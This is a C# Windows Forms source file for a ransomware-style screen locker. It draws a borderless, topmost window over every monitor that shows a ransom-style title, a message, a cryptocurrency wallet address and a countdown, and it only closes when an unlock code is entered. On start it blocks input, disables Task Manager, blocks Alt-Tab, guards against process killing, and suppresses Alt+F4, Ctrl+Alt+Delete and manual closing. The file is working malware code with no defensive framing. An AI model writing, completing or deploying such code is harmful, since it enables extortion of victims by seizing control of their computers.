namespace ScreenLocker.Forms;

using System.Drawing;
using System.Windows.Forms;
using ScreenLocker.Config;
using ScreenLocker.Protection;
using ScreenLocker.Utils;

public sealed class LockScreenForm : Form
{
    private readonly LockConfig _config;
    private readonly MessageConfig _messageConfig;
    private readonly CountdownPanel _countdownPanel;
    private readonly InputBlocker _inputBlocker;
    private Label _titleLabel = null!;
    private Label _messageLabel = null!;
    private Label _walletLabel = null!;
    private Button _unlockButton = null!;

    public LockScreenForm(LockConfig config, MessageConfig messageConfig)
    {
        _config = config;
        _messageConfig = messageConfig;
        _countdownPanel = new CountdownPanel(config.LockDuration);
        _inputBlocker = new InputBlocker();

        InitializeForm();
        InitializeControls();
        StartProtection();
    }

    private void InitializeForm()
    {
        FormBorderStyle = FormBorderStyle.None;
        WindowState = FormWindowState.Maximized;
        TopMost = true;
        ShowInTaskbar = false;
        BackColor = Color.FromArgb(20, 20, 30);
        StartPosition = FormStartPosition.CenterScreen;
        KeyPreview = true;

        foreach (var screen in Screen.AllScreens)
        {
            if (screen.Primary) continue;
            var coverForm = new Form
            {
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                TopMost = true,
                ShowInTaskbar = false,
                BackColor = Color.Black,
                StartPosition = FormStartPosition.Manual,
                Location = screen.Bounds.Location,
                Size = screen.Bounds.Size
            };
            coverForm.Show();
        }
    }

    private void InitializeControls()
    {
        _titleLabel = new Label
        {
            Text = _messageConfig.Title,
            Font = new Font("Segoe UI", 36, FontStyle.Bold),
            ForeColor = Color.Red,
            AutoSize = true,
            BackColor = Color.Transparent
        };

        _messageLabel = new Label
        {
            Text = _messageConfig.Message,
            Font = new Font("Segoe UI", 14),
            ForeColor = Color.White,
            AutoSize = false,
            Size = new Size(800, 200),
            TextAlign = ContentAlignment.MiddleCenter,
            BackColor = Color.Transparent
        };

        _walletLabel = new Label
        {
            Text = _messageConfig.WalletAddress,
            Font = new Font("Consolas", 12),
            ForeColor = Color.Yellow,
            AutoSize = true,
            BackColor = Color.Transparent
        };

        _unlockButton = new Button
        {
            Text = "Enter Unlock Code",
            Font = new Font("Segoe UI", 12),
            Size = new Size(200, 45),
            FlatStyle = FlatStyle.Flat,
            ForeColor = Color.White,
            BackColor = Color.FromArgb(60, 60, 80)
        };
        _unlockButton.FlatAppearance.BorderColor = Color.Gray;
        _unlockButton.Click += OnUnlockButtonClick;

        _countdownPanel.Dock = DockStyle.None;
        _countdownPanel.Size = new Size(400, 80);

        Controls.Add(_titleLabel);
        Controls.Add(_messageLabel);
        Controls.Add(_walletLabel);
        Controls.Add(_unlockButton);
        Controls.Add(_countdownPanel);

        Resize += (_, _) => LayoutControls();
        LayoutControls();
    }

    private void LayoutControls()
    {
        int centerX = ClientSize.Width / 2;
        int y = ClientSize.Height / 6;

        _titleLabel.Location = new Point(centerX - _titleLabel.Width / 2, y);
        y += _titleLabel.Height + 40;

        _messageLabel.Location = new Point(centerX - _messageLabel.Width / 2, y);
        y += _messageLabel.Height + 30;

        _walletLabel.Location = new Point(centerX - _walletLabel.Width / 2, y);
        y += _walletLabel.Height + 40;

        _countdownPanel.Location = new Point(centerX - _countdownPanel.Width / 2, y);
        y += _countdownPanel.Height + 40;

        _unlockButton.Location = new Point(centerX - _unlockButton.Width / 2, y);
    }

    private void StartProtection()
    {
        _inputBlocker.BlockInput();
        TaskManagerDisabler.Disable();
        AltTabBlocker.Block();
        ProcessKillGuard.Start();
        _countdownPanel.StartCountdown();
    }

    private void OnUnlockButtonClick(object? sender, EventArgs e)
    {
        var unlockForm = new UnlockForm(_config.UnlockCode);
        unlockForm.ShowDialog(this);

        if (unlockForm.IsUnlocked)
        {
            StopProtection();
            Close();
        }
    }

    private void StopProtection()
    {
        _inputBlocker.UnblockInput();
        TaskManagerDisabler.Enable();
        AltTabBlocker.Unblock();
        ProcessKillGuard.Stop();
    }

    protected override void OnFormClosing(FormClosingEventArgs e)
    {
        if (e.CloseReason == CloseReason.UserClosing)
        {
            e.Cancel = true;
            return;
        }
        base.OnFormClosing(e);
    }

    protected override void OnKeyDown(KeyEventArgs e)
    {
        if (e.Alt && e.KeyCode == Keys.F4)
            e.Handled = true;

        if (e.Control && e.Alt && e.KeyCode == Keys.Delete)
            e.Handled = true;

        base.OnKeyDown(e);
    }

    protected override CreateParams CreateParams
    {
        get
        {
            var cp = base.CreateParams;
            cp.ExStyle |= 0x00000008; // WS_EX_TOPMOST
            return cp;
        }
    }
}
